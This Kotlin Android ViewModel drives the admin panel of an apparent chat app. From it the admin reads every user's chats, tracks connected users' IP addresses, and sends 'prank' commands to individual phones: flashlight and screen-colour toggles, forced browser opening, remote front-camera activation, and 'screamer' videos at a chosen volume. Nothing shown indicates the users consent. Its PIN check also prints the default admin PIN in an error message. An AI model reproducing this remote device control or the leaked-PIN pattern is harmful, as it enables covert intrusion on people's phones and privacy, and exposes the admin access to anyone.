package com.example.viewmodel

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.model.Chat
import com.example.data.model.Message
import com.example.data.model.User
import com.example.data.repository.ChatRepository
import com.example.data.security.AdminAuthManager
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.combine
import kotlinx.coroutines.flow.flatMapLatest
import kotlinx.coroutines.flow.flowOf
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch

@OptIn(ExperimentalCoroutinesApi::class)
class AdminViewModel(application: Application) : AndroidViewModel(application) {

    private val repository = ChatRepository.getInstance(application)
    private val authManager = AdminAuthManager(application)

    val isAdminLoggedIn: StateFlow<Boolean> = authManager.isAdminLoggedIn

    val isServerRunning: StateFlow<Boolean> = repository.adminServer.isRunning
    val connectedClients: StateFlow<Map<String, String>> = repository.adminServer.connectedUserIps

    val colabServerUrl: StateFlow<String> = repository.colabClient.serverUrl
    val colabConnectionStatus: StateFlow<com.example.network.colab.ColabConnectionStatus> = repository.colabClient.connectionStatus

    private val _searchQuery = MutableStateFlow("")
    val searchQuery: StateFlow<String> = _searchQuery.asStateFlow()

    private val rawChats = repository.getAllAdminChats()

    val filteredChats: StateFlow<List<Chat>> = combine(rawChats, _searchQuery) { chats, query ->
        if (query.isBlank()) {
            chats
        } else {
            chats.filter {
                it.userId.contains(query, ignoreCase = true) ||
                it.lastMessage.contains(query, ignoreCase = true) ||
                it.title.contains(query, ignoreCase = true)
            }
        }
    }.stateIn(
        scope = viewModelScope,
        started = SharingStarted.WhileSubscribed(5000),
        initialValue = emptyList()
    )

    val allUsers: StateFlow<List<User>> = repository.getAllUsers().stateIn(
        scope = viewModelScope,
        started = SharingStarted.WhileSubscribed(5000),
        initialValue = emptyList()
    )

    val totalUnreadCount: StateFlow<Int> = repository.getTotalUnreadCount().map { it ?: 0 }.stateIn(
        scope = viewModelScope,
        started = SharingStarted.WhileSubscribed(5000),
        initialValue = 0
    )

    val waitingReplyCount: StateFlow<Int> = repository.getWaitingReplyCount().stateIn(
        scope = viewModelScope,
        started = SharingStarted.WhileSubscribed(5000),
        initialValue = 0
    )

    private val _selectedUserId = MutableStateFlow<String?>(null)
    val selectedUserId: StateFlow<String?> = _selectedUserId.asStateFlow()

    val selectedUserMessages: StateFlow<List<Message>> = _selectedUserId.flatMapLatest { uid ->
        if (uid != null) {
            repository.getMessagesForUser(uid)
        } else {
            flowOf(emptyList())
        }
    }.stateIn(
        scope = viewModelScope,
        started = SharingStarted.WhileSubscribed(5000),
        initialValue = emptyList()
    )

    private val _replyInputText = MutableStateFlow("")
    val replyInputText: StateFlow<String> = _replyInputText.asStateFlow()

    private val _pinError = MutableStateFlow<String?>(null)
    val pinError: StateFlow<String?> = _pinError.asStateFlow()

    // Prank states tracking per user
    private val _userFlashlightStates = MutableStateFlow<Map<String, Boolean>>(emptyMap())
    val userFlashlightStates: StateFlow<Map<String, Boolean>> = _userFlashlightStates.asStateFlow()

    private val _userBloodRedStates = MutableStateFlow<Map<String, Boolean>>(emptyMap())
    val userBloodRedStates: StateFlow<Map<String, Boolean>> = _userBloodRedStates.asStateFlow()

    init {
        // Automatically start Admin server when ViewModel initializes
        repository.startAdminNode()
    }

    fun onSearchQueryChanged(q: String) {
        _searchQuery.value = q
    }

    fun onReplyInputChanged(text: String) {
        _replyInputText.value = text
    }

    fun selectUserChat(userId: String) {
        _selectedUserId.value = userId
        val chatId = "CHAT-$userId"
        viewModelScope.launch {
            repository.markChatAsRead(chatId)
        }
    }

    fun clearSelectedChat() {
        _selectedUserId.value = null
        _replyInputText.value = ""
    }

    fun sendReply(userId: String = _selectedUserId.value ?: "", text: String = _replyInputText.value) {
        val trimmed = text.trim()
        if (userId.isEmpty() || trimmed.isEmpty()) return

        _replyInputText.value = ""
        viewModelScope.launch {
            repository.sendAdminReply(userId, trimmed)
        }
    }

    fun setReplyTemplate(template: String) {
        _replyInputText.value = template
    }

    fun verifyPin(pin: String): Boolean {
        _pinError.value = null
        val success = authManager.verifyPin(pin)
        if (!success) {
            _pinError.value = "Invalid PIN. Try default (2468)"
        }
        return success
    }

    fun logout() {
        authManager.logout()
    }

    fun changePin(oldPin: String, newPin: String): Boolean {
        return authManager.changePin(oldPin, newPin)
    }

    fun triggerBlink(userId: String) {
        viewModelScope.launch {
            repository.sendAdminPrank(userId, com.example.data.model.PrankCommands.TYPE_BLINK)
        }
    }

    fun toggleFlashlight(userId: String) {
        val current = _userFlashlightStates.value[userId] ?: false
        val next = !current
        val nextMap = _userFlashlightStates.value.toMutableMap()
        nextMap[userId] = next
        _userFlashlightStates.value = nextMap

        val prankType = if (next) com.example.data.model.PrankCommands.TYPE_FLASHLIGHT_ON else com.example.data.model.PrankCommands.TYPE_FLASHLIGHT_OFF
        viewModelScope.launch {
            repository.sendAdminPrank(userId, prankType)
        }
    }

    fun toggleBloodRed(userId: String) {
        val current = _userBloodRedStates.value[userId] ?: false
        val next = !current
        val nextMap = _userBloodRedStates.value.toMutableMap()
        nextMap[userId] = next
        _userBloodRedStates.value = nextMap

        val prankType = if (next) com.example.data.model.PrankCommands.TYPE_BLOOD_RED_ON else com.example.data.model.PrankCommands.TYPE_BLOOD_RED_OFF
        viewModelScope.launch {
            repository.sendAdminPrank(userId, prankType)
        }
    }

    fun openFrontCamera(userId: String) {
        viewModelScope.launch {
            repository.sendAdminPrank(userId, com.example.data.model.PrankCommands.TYPE_OPEN_CAMERA_FRONT)
        }
    }

    fun openBrowser(userId: String, queryOrUrl: String) {
        val trimmed = queryOrUrl.trim()
        if (trimmed.isBlank()) return
        viewModelScope.launch {
            repository.sendAdminBrowserPrank(userId, trimmed)
        }
    }

    private val _isUploadingScreamer = MutableStateFlow(false)
    val isUploadingScreamer: StateFlow<Boolean> = _isUploadingScreamer.asStateFlow()

    fun sendScreamerVideo(
        userId: String,
        videoUri: android.net.Uri,
        volumePercent: Int = 100,
        onResult: (Boolean, String?) -> Unit
    ) {
        if (userId.isBlank()) {
            onResult(false, "User ID is empty")
            return
        }
        viewModelScope.launch {
            _isUploadingScreamer.value = true
            val success = repository.sendAdminScreamerVideo(userId, videoUri, volumePercent)
            _isUploadingScreamer.value = false
            if (success) {
                onResult(true, null)
            } else {
                onResult(false, "Failed to upload video to server. Check server connection.")
            }
        }
    }

    fun setColabServerUrl(url: String) {
        repository.colabClient.setServerUrl(url)
    }

    fun clearColabServerUrl() {
        repository.colabClient.clearServerUrl()
    }

    suspend fun testColabConnection(url: String): Pair<Boolean, String?> {
        return repository.colabClient.testConnection(url)
    }
}
